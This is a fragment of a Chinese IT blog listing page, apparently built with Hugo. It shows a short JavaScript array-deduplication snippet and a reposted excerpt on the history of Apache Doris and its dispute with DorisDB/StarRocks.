		 js数组去重 简单方法 // 数组去重 方法一 function sub3(arr) { let newArr = [] arr.forEach(item =&gt; { if (newArr.indexOf(item) == -1) { newArr.push(item) } }); return newArr; } let ex1 = [1, 2, 3, 'r', 'r', 'e', 'e', 'd', 3, 1, 4, 6, 8] // 数组去重 方法二 let ex2 = Array.from(new Set(ex1)) console.log(ex2, sub3(ex1)) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09843afbae1a7479ffb5f9465555def6/" rel="bookmark">
			【转】Apache Doris介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转：Apache Doris介绍_wapecheng的博客-CSDN博客_apache doris 一、关于 Apache Doris 和 DorisDB、StarRocks 的关系 Doris 最早是解决百度凤巢统计报表的专用系统，随着百度业务的飞速发展对系统进行了多次迭代，逐渐承担起百度内部业务的统计报表和多维分析需求。2013 年，我们把 Doris 进行了 MPP 框架的升级，并将新系统命名为 Palo ，2017 年我们以百度 Palo 的名字在 GitHub 上进行了开源，2018 年贡献给 Apache 基金会时，由于与国外数据库厂商重名，因此选择用回最初的名字，这就是 Apache Doris 的由来。
那么 StarRocks 以及 DorisDB 是什么？
2020 年 2 月，百度 Doris 团队的个别同学离职创业，基于 Apache Doris 之前的版本做了自己的商业化闭源产品 DorisDB ，这就是 StarRocks 的前身。
按照 Apache License，基于开源产品进行商业化是被允许的。
但是 DorisDB 团队在对外宣传时，会宣称自己“是 Apache Doris 的主创团队”、“ Apache Doris 的核心开发人员大部分在任职”等诸类话术。
实际上， GitHub 上公开的数据显示，Apache Doris 贡献代码前三的 Contributor 全部在百度 Doris 团队就职，不知所谓的“大部分”和“主创”从何说起。
实际上，从 2020 年初起， DorisDB 团队几乎没有向 Apache Doris 提交过一行代码。少部分开发者原本是 Apache Doris 的 Contributor ，在加入 DorisDB 团队后，同样不再向 Apache Doris 贡献一行代码。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/09843afbae1a7479ffb5f9465555def6/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/134/">«</a>
	<span class="pagination__item pagination__item--current">135/279</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/136/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>